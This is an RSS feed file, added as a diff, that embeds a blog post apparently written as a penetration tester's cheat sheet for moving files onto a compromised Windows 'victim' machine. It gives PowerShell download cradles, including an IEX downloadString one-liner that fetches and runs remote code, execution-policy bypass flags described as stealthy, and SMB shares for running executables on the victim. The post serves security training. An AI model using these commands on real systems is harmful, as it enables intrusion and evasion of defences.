@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Cheatsheet on Ally Petitt</title>
+    <link>https://ally-petitt.github.io/ally-petitt/tags/cheatsheet/</link>
+    <description>Recent content in Cheatsheet on Ally Petitt</description>
+    <generator>Hugo -- 0.125.4</generator>
+    <language>en-us</language>
+    <lastBuildDate>Wed, 08 Jun 2022 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://ally-petitt.github.io/ally-petitt/tags/cheatsheet/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Pentester’s Guide to Performing File Transfers</title>
+      <link>https://ally-petitt.github.io/ally-petitt/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</link>
+      <pubDate>Wed, 08 Jun 2022 00:00:00 +0000</pubDate>
+      <guid>https://ally-petitt.github.io/ally-petitt/posts/2022-06-08_pentester-s-guide-to-performing-file-transfers-3c1a6a38dfc8/</guid>
+      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HNC0lT4gPMDU8uH0fyjRyw.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;h1 id=&#34;foreword&#34;&gt;Foreword&lt;/h1&gt;
+&lt;p&gt;To avoid detection, it is best to use tools that are native to the victim’s computer.&lt;/p&gt;
+&lt;h1 id=&#34;ftp-with-windowshost&#34;&gt;FTP with Windows Host&lt;/h1&gt;
+&lt;p&gt;While having a shell on the Windows machine, start an FTP server on your host machine. Follow these steps if you don’t already have FTP server installed:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo apt-get install vsftpd  
+sudo service vsftpd start  
+service vsftpd status #status should be active
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To check if your server is working, type &lt;code&gt;ftp localhost.&lt;/code&gt; If you see the message “Connected to localhost”, your FTP server is running.&lt;/p&gt;
+&lt;h2 id=&#34;accessing-file-with-interactive-shell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*ehYiaPXjraslOYhNqIv7Zw.png&#34; alt=&#34;&#34;  /&gt;
+
+Accessing File With Interactive Shell&lt;/h2&gt;
+&lt;p&gt;If you have an interactive shell on the Windows machine, run this command.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;cscript wget.vbs http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt; &amp;lt;FILENAME TO SAVE AS&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;accessing-file-with-non-interactive-shell&#34;&gt;Accessing File With Non-Interactive Shell&lt;/h2&gt;
+&lt;p&gt;If you don’t have an interactive shell, you can’t start PowerShell.exe. A workaround is to create a PowerShell script and execute it:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;echo $storageDir = $pwd &amp;gt; wget.ps1  
+echo $webclient = New-Object System.Net.WebClient &amp;gt;&amp;gt;wget.ps1  
+echo $url = &amp;#34;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;PATH TO FILE&amp;gt;&amp;#34; &amp;gt;&amp;gt;wget.ps1  
+echo $file = &amp;#34;output-file.exe&amp;#34; &amp;gt;&amp;gt;wget.ps1  
+echo $webclient.DownloadFile($url,$file) &amp;gt;&amp;gt;wget.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To invoke&lt;code&gt;wget.ps1&lt;/code&gt;, call&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-ExecutionPolicy Bypass -noLogo -NonInteractive --- stealthly
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;IEX(New-Object Net.WebClient).downloadString(&amp;#39;http://&amp;lt;YOUR IP&amp;gt;/&amp;lt;FILENAME&amp;gt;&amp;#39;)
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;getting-files-through-powershell&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*nBHrLvu-D9RNlMsbTG3Wsg.jpeg&#34; alt=&#34;&#34;  /&gt;
+
+Getting Files Through PowerShell&lt;/h1&gt;
+&lt;p&gt;On your Kali Linux machine, make a copy of the file you want to send to &lt;code&gt;/var/www/html/&lt;/code&gt; . On the Window’s machine, execute the following:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.10.128/unko.txt&amp;#39;,&amp;#39;C:\Users\Administrator\Desktop\transferme.txt&amp;#39;)&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell -c &amp;#34;(new-object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.119.146/gori.ps1&amp;#39;)&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-withsmb&#34;&gt;File Transfer With SMB&lt;/h1&gt;
+&lt;h2 id=&#34;method-1&#34;&gt;Method 1&lt;/h2&gt;
+&lt;p&gt;Get &lt;code&gt;smbserver.py&lt;/code&gt;from &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt; and run the following on your Kali Linux machine:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbserver.py gori $(pwd) -smb2support -user gori -pass gorigori
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;New-PSDrive -Name &amp;#34;gori&amp;#34; -PSProvider &amp;#34;FileSystem&amp;#34; -gori &amp;#34;\\&amp;lt;YOUR IP&amp;gt;\gori&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;method-2&#34;&gt;Method 2&lt;/h2&gt;
+&lt;p&gt;Run this on your Kali machine:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;smbserver.py kali .
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Run this on the victim’s machine:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;On victim&amp;#39;s \\&amp;lt;YOUR IP ADDRESS&amp;gt;\kali\FILE\_NAME.exe &amp;#34;whoami&amp;#34; # &amp;#34;whoami&amp;#34; confirms that it is running
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-with-an-httpserver&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*i6K6JFM5TTxSFf4b_ermuQ.png&#34; alt=&#34;&#34;  /&gt;
+
+File Transfer With an HTTP Server&lt;/h1&gt;
+&lt;p&gt;On your machine run:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will start an HTTP server on port 80 with the root of the HTTP server being in the directory that you executed the command from. To get a file, run this on the victim’s machine:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;wget http://&amp;lt;YOUR IP&amp;gt;/path/to/file.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;file-transfer-with-scp-andrsync&#34;&gt;File Transfer with SCP and RSYNC&lt;/h1&gt;
+&lt;p&gt;Both of these methods of file transfer occur over SSH. Secure Copy Protocol (SCP) is being deprecated, however, if you’re able to use it, the syntax is fairly simple.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this example, we are using SCP to copy a file from a remote host to the working directory of our local machine such that our computer is on the receiving end.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp username@ip_address:/home/username/filename
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you are looking to transfer a file from your computer to the remote host, the following syntax can be used:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;scp filename username@ip_address:/home/username
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The same commands can be used with RYSNC by simply replacing &lt;code&gt;scp&lt;/code&gt; with &lt;code&gt;rsync&lt;/code&gt; .&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;rsync &amp;lt;SOURCE&amp;gt; &amp;lt;DESTINATION&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;There are countless ways to transfer files between two computers. Among the most common methods are HTTP and FTP, but if those don’t work, there is a chance that some of the other options here will. Some honorable mentions that I didn’t go into detail on are SSHFS, SFTP, Winscp, and Samba. I hope that you were able to find value in this article and remember to never stop learning.&lt;/p&gt;
+</description>
+    </item>
+  </channel>
+</rss>
